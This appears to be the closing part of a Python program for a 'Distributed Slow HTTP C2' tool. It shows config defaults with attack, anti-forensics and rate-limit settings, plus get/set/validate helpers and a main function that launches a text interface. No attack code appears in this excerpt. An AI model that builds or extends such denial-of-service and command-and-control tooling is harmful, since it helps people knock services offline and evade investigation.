                'connect_timeout': 10,
                'read_timeout': 30,
                'max_retries': 3,
                'retry_delay': 5
            },
            'security': {
                'encryption_enabled': True,
                'secure_delete': True,
                'anti_forensics': True
            },
            'logging': {
                'level': 'INFO',
                'max_file_size': 10485760,
                'backup_count': 5
            },
            'performance': {
                'thread_pool_size': 50,
                'connection_pool_size': 100,
                'rate_limit': 1000
            }
        }
        
    def get(self, key, default=None):
        """Get configuration value"""
        keys = key.split('.')
        value = self.config
        
        for k in keys:
            if isinstance(value, dict) and k in value:
                value = value[k]
            else:
                return default
                
        return value
        
    def set(self, key, value):
        """Set configuration value"""
        keys = key.split('.')
        config = self.config
        
        for k in keys[:-1]:
            if k not in config:
                config[k] = {}
            config = config[k]
            
        config[keys[-1]] = value
        self.save_config()
        
    def validate_config(self):
        """Validate configuration"""
        required_keys = [
            'version',
            'attack.default_connections',
            'network.connect_timeout',
            'security.encryption_enabled'
        ]
        
        for key in required_keys:
            if self.get(key) is None:
                logger.warning(f"Missing required config key: {key}")
                return False
                
        return True


def main():
    """Main function to run the application"""
    # Check Python version
    if sys.version_info < (3, 6):
        print("Python 3.6+ required")
        sys.exit(1)
    
    # Create necessary directories
    os.makedirs('logs', exist_ok=True)
    
    # Initialize and run TUI
    try:
        print("Starting Distributed Slow HTTP C2 - ADVANCED EDITION...")
        tui = SlowHTTPTUI()
        tui.run()
    except Exception as e:
        logger.critical(f"Fatal error: {str(e)}")
        logger.critical(traceback.format_exc())
        print(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
